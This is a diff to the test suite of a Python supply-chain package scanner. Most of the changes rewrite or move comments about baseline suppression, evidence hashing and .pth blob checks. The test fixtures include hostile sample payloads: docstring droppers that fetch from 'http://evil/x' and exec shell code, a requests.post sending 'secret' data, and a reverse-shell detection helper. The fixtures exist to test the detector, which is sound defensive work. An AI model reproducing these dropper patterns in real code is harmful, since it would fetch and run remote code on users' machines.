@@ -388,7 +388,8 @@ def test_baseline_key_line_shift_stable_but_code_specific():
         "Env: L612: env = os.environ.copy()\nNetwork: L48: from urllib.request import getproxies",
     )
     assert sp._finding_key(base) == sp._finding_key(shifted)
-    # ...but a NEW payload in the same file/check does not inherit the suppression -- this is the supply-chain bypass we
+    # ...but a NEW payload in the same file/check (different matched code) does not inherit the suppression -- this is
+    # the supply-chain bypass we close.
     malicious = _mk(
         sp.CRITICAL,
         "botocore",
@@ -611,7 +612,8 @@ def test_the_hf_backoff_suppression_is_narrow():
     ]
     assert entries, "http_backoff is no longer allowlisted; Security audit is red"
 
-    # Digest-pinned, not line-pinned:
+    # Digest-pinned, not line-pinned: each evidence carries the sha256 of the span it was reviewed against, which is
+    # what makes an edit to the loop reopen the finding instead of riding the old entry.
     for entry in entries:
         assert "sha256:" in entry["evidence"], (
             f"{entry['evidence_hash'][:12]} is not pinned to reviewed code, so any "
@@ -746,7 +748,8 @@ def test_extract_evidence_caps_long_line_but_binds_tail():
 
 
 def test_extract_evidence_binds_call_continuation_past_12_lines():
-    # A matched call that stays open well beyond the old 12-line continuation cap still binds its later arguments:
+    # A matched call that stays open well beyond the old 12-line continuation cap still binds its later arguments: a
+    # changed body on a deep continuation line (here ~22 lines in) must reopen instead of riding the first 12 lines.
     head = "requests.post('http://h',\n"
     middle = "".join(f"    opt{i} = ({i}),\n" for i in range(20))
     old = head + middle + "    data = {'x': 'old'},\n)\n"
@@ -797,6 +800,8 @@ def test_extract_evidence_binds_call_embedded_in_string():
 
 
 def test_extract_evidence_overflow_digest_is_line_shift_stable():
+    # The overflow digest canonicalizes (strips L<NN>: markers), so inserting an unrelated line above the overflow
+    # region does not change it, while a real payload change inside the overflow still reopens.
     n = sp._MAX_EVIDENCE_SPANS
     src = "\n".join(f"requests.get('http://a/p{i}')" for i in range(n + 5))
     sha = lambda e: re.search(r"more\) sha256:([0-9a-f]+)", e).group(1)
@@ -809,8 +814,9 @@ def test_extract_evidence_overflow_digest_is_line_shift_stable():
 
 
 def test_extract_evidence_overflow_is_streamed_and_bounded():
-    # The overflow digest canonicalizes (strips L<NN>:
     # Past the display cap the evidence streams overflow spans into one digest instead of materializing a rendered span
+    # per match, so the string stays bounded (at most cap spans plus the "(+N more)" digest) while N counts every
+    # overflow match and a change to an over-cap match still reopens.
     n = sp._MAX_EVIDENCE_SPANS
     src = "\n".join(f"requests.get('http://a/p{i}')" for i in range(n + 500))
     ev = sp._extract_evidence(src, sp.RE_NETWORK)
@@ -823,9 +829,10 @@ def test_extract_evidence_overflow_is_streamed_and_bounded():
 
 
 def test_extract_evidence_same_line_close_then_open_binds_call():
-    # A continued statement that closes on the same physical line that opens a flagged call, e.g.
-    # requests.post(`, nets to <= 0 under a plain bracket count, dropping the call's `(` so the scan would stop at the
-    # opener line.
+    # A continued statement that closes on the same physical line that opens a flagged call, e.g. `]; requests.post(`,
+    # nets to <= 0 under a plain bracket count, dropping the call's `(` so the scan would stop at the opener line.
+    # Order-aware counting keeps the opener, so the argument lines bind and a changed body on a continuation line
+    # reopens.
     old = "x = [a]; requests.post(\n  'http://h/old',\n  data=secret,\n)\n"
     new = "x = [a]; requests.post(\n  'http://h/old',\n  data=EVIL,\n)\n"
     assert sp._evidence_hash(sp._extract_evidence(old, sp.RE_NETWORK)) != sp._evidence_hash(
@@ -960,7 +967,8 @@ def test_canon_evidence_keeps_duplicate_spans():
 
 
 def test_canon_evidence_does_not_strip_inner_marker_from_raw_code():
-    # Raw .pth evidence has no leading L<NN>:
+    # Raw .pth evidence has no leading L<NN>: marker; an L<NN>:-looking substring inside the code must be kept, so
+    # changing the code before it reopens.
     base = _mk(
         sp.HIGH,
         "p",
@@ -1142,6 +1150,8 @@ def test_pth_large_blob_finding_binds_every_blob():
 
 
 def test_pth_unusually_large_finding_is_content_bound():
+    # Two different payloads of equal size and import count must get different keys: the finding now pins the .pth
+    # content via a digest.
     a = [
         f
         for f in sp.check_pth_file("import abc; n=" + repr("!" * 500), "p/x.pth", "p")
@@ -1320,7 +1330,6 @@ def test_pth_large_blob_finding_is_content_bound():
     # The .pth base64-blob evidence pins the full blob via a digest, so a payload that keeps the first 120 chars but
     # changes the tail reopens the finding.
     head = "A" * 120
-    # Two different payloads of equal size and import count must get different keys:
     a = [
         f
         for f in sp.check_pth_file("import os\n" + head + "B" * 200, "p/x.pth", "p")
@@ -1395,6 +1404,8 @@ def test_exec_with_payload_hidden_in_docstring_flagged():
 
 
 def test_hidden_network_plus_exec_payload_flagged():
+    # exec(__doc__) dropper: the docstring (blanked by code-only scanning) holds BOTH a network fetch and an os/shell
+    # exec. Neither is a blob, but together they are the payload, so the gate must flag the pair.
     payload = (
         "import urllib.request, os\n"
         "urllib.request.urlopen('http://x/y').read()\n"
@@ -1418,8 +1429,8 @@ def test_real_code_network_and_subprocess_not_hidden_combo():
 
 
 def test_hidden_payload_survives_visible_decoy():
-    # A benign visible network call must not mask a docstring payload: the
-    # exec(__doc__) dropper: the docstring (blanked by code-only scanning) holds BOTH a network fetch and an os/shell
+    # A benign visible network call must not mask a docstring payload: the detector inspects the removed (blanked)
+    # span, not the whole stripped file.
     payload = (
         "import urllib.request, os\n"
         "urllib.request.urlopen('http://evil/x').read()\n"
@@ -1514,6 +1525,8 @@ def test_load_baseline_missing_file_is_empty():
 
 
 def test_load_baseline_rejects_non_list_entries(tmp_path, capsys):
+    # A malformed baseline whose "entries" is not a list must warn and fail closed (empty), not raise TypeError when
+    # iterated.
     import json
 
     bl = tmp_path / "bad_entries.json"
@@ -1562,8 +1575,6 @@ def test_committed_baseline_suppresses_known_but_not_a_new_payload():
 def test_committed_baseline_entries_all_carry_evidence_hash():
     """Every shipped entry must pin an evidence_hash; an entry without one would
     silently fall back to the coarse legacy match for that file/check."""
-    # A malformed baseline whose "entries" is not a list must warn and fail closed (empty), not raise TypeError when
-    # iterated.
     import json
 
     baseline_path = REPO_ROOT / "scripts" / "scan_packages_baseline.json"
@@ -1681,6 +1692,8 @@ def test_marker_holds_by_default():
 
 
 def test_requires_dist_for_fails_closed_on_missing_pin_metadata(monkeypatch):
+    # The pinned release's own metadata cannot be fetched -> recover nothing rather than substituting the latest
+    # release's (wrong) dependency tree.
     project = _meta([], requires = ["latestdep==9.9.9"])
     monkeypatch.setattr(sp, "_pypi_json", lambda name, version = None: None if version else project)
     assert sp._requires_dist_for("oldpkg", "1.0.0", project) == []
@@ -1698,10 +1711,8 @@ def test_requires_dist_for_uses_pinned_release(monkeypatch):
 
 
 def test_requires_dist_for_records_incomplete_scan_error(monkeypatch):
-    # The pinned release's own metadata cannot be fetched -> recover nothing
-    # rather than substituting the latest release's (wrong) dependency tree.
-    # [] that a caller cannot tell apart from a genuine no-deps release.
     # Missing pinned metadata must surface an incomplete-scan error, not a silent [] that a caller cannot tell apart
+    # from a genuine no-deps release.
     project = _meta([], requires = ["latestdep==9.9.9"])
     monkeypatch.setattr(sp, "_pypi_json", lambda name, version = None: None if version else project)
     errors: list[str] = []
@@ -1847,6 +1858,8 @@ def test_run_fix_uses_first_archive_path(monkeypatch):
     monkeypatch.setattr(sp.os, "makedirs", lambda *a, **k: None)
     monkeypatch.setattr(sp.shutil, "rmtree", lambda *a, **k: None)
 
+    # CRITICAL package with no pinned version -> must download to resolve it, reaching downloaded[0][1] (the first
+    # archive's path).
     entries = [
         {
             "name": "foo",
@@ -1875,6 +1888,7 @@ def test_pinned_baseline_entry_only_covers_the_reviewed_file(tmp_path):
     reviewed.file_sha256 = "a" * 64
     sp._write_baseline(str(bl), [reviewed])
 
+    # _write_baseline only pins what was already pinned, so a fresh entry is unpinned.
     doc = json.loads(bl.read_text(encoding = "utf-8"))
     assert "file_sha256" not in doc["entries"][0]
     doc["entries"][0]["file_sha256"] = "a" * 64
@@ -1912,7 +1926,6 @@ def test_write_baseline_preserves_an_existing_pin(tmp_path):
     f = _mk(sp.CRITICAL, "p", "a.py", "c1", "L1: x")
     f.file_sha256 = "a" * 64
     sp._write_baseline(str(bl), [f])
-    # _write_baseline only pins what was already pinned, so a fresh entry is unpinned.
     doc = json.loads(bl.read_text(encoding = "utf-8"))
     doc["entries"][0]["file_sha256"] = "a" * 64
     bl.write_text(json.dumps(doc), encoding = "utf-8")
@@ -2053,8 +2066,6 @@ def test_the_duplicate_check_sees_through_normalization(tmp_path):
         evidence = "L1:     while True:",
         evidence_hash = sp._evidence_hash("L1:     while True:"),
     )
-    # CRITICAL package with no pinned version -> must download to resolve it, reaching downloaded[0][1] (the first
-    # archive's path).
     entries = [
         dict(package = "huggingface_hub", file = "foo-1.0/huggingface_hub/a.py", **same),
         dict(package = "huggingface-hub", file = "huggingface_hub/a.py", **same),
@@ -2430,10 +2441,8 @@ def test_the_toml_helpers_run_without_stdlib_tomllib(monkeypatch):
     assert any(source == "pyproject.toml" for source, _ in _audited_requirements(REPO_ROOT))
 
 
-# dup2 needs a socket to mean "reverse shell"
-
-
 # ──────────────────────────────────────────────────────────────────────
+# dup2 needs a socket to mean "reverse shell"
 
 
 def _reverse_shell_findings(source: str):
